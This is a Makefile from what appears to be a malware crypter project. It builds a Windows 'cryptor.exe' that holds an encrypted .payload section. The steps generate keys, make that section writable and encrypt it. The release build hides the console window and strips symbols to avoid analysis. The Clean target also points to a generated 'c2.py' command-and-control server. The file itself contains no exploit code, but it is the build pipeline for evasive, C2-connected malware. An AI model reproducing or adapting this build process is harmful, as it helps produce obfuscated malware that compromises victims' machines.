# Make file that builds the working cryptor
#
# Copyright (C) 2020  @Qu3b411
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#


Dpath = ./bin/Debug
Rpath = ./bin/Release
SrcPath = ./CL_SRC
SvrPath = ./SVR_SRC

Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Dpath)

	@echo [*] Dynamically Generating header files

	@echo [*] Checking Config File for server requirements. This may require configration!
	py ./MFScripts/config.py
	@echo Config file found at expected location!
	@echo [*] Generating keys...
	py ./MFScripts/KeyGen.py
	@echo Keys Generated!
	@echo Header files Generated.
	@echo [*] LINKING FILE...
	gcc -g -T $(SrcPath)/Linker.ld  $(SrcPath)/main.c -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
	@echo COMPLETED: file has been linked into a mn executable format!


	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
	@echo COMPLETED, .payload section is now writable

	@echo [*] Encrypting .payload section...
	py ./MFScripts/cryptPayload.py $(Dpath)

Release: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Config.h) $(Rpath)

	@echo [*] Dynamically Generating header files

	@echo [*] Checking Config File for server requirements. This may require configration!
	py ./MFScripts/config.py
	@echo Config file found at expected location!
	@echo [*] Generating keys...
	py ./MFScripts/KeyGen.py
	@echo Keys Generated!
	@echo Header files Generated.

	@echo [*] LINKING FILE...
	# -mwindows 
	gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/Linker.ld  $(SrcPath)/main.c -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
	@echo COMPLETED: file has been linked into a mn executable format!
	strip -R .comment -R .note $(Rpath)/cryptor.exe
	strip -s $(Rpath)/cryptor.exe

	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
	@echo COMPLETED, .payload section is now writable

	@echo [*] Encrypting .payload section...
	py ./MFScripts/cryptPayload.py $(Rpath)

Clean:
	@echo Cleanning all generated files and directories
	rm -rf ./bin
	rm -f $(SrcPath)/Cryptor.h
	rm -f $(SvrPath)/c2.py
	rm -rf $(SvrPath)/__pycache__
	rm -f ./Conf
	@echo Directorys and files are clean.

.PHONY: Conf
Conf:
	@echo Removing current Conf file
	rm -f ./conf
	py ./MFScripts/config.py

$(Dpath):
	mkdir -p $(Dpath)

$(Rpath):
	mkdir -p $(Rpath)
